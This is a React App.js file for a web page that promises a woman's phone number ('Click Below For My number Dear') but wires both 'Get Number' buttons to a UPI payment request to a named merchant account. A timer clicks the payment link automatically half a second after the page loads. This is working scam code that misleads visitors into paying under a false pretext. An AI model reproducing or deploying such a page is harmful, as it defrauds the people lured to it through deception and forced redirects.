import './App.css';

function App() {
  setTimeout(()=>{
    document.querySelector('#myButton').click();
  },500)
  return (
    <div className="App">
      <header className="App-header">
      <h1>Click Below For My number Dear😘😘</h1>
      <a  id="myButton" className="button" type="button" href= "upi://pay?pa=bharatpe.0851610820@icici&pn= Shruthi Reddy&cu=INR&tn=Shruthi Reddy&tr=APP" target="_blank" rel="noopener noreferrer">Get Number!!</a>
      <a  id="myButton1" className="button1" type="button" href= "upi://pay?pa=bharatpe.0851610820@icici&pn= Shruthi Reddy&cu=INR&tn=Shruthi Reddy&tr=APP" target="_blank" rel="noopener noreferrer">Click Here!!</a>
      </header>
    </div>
  );
}

export default App;
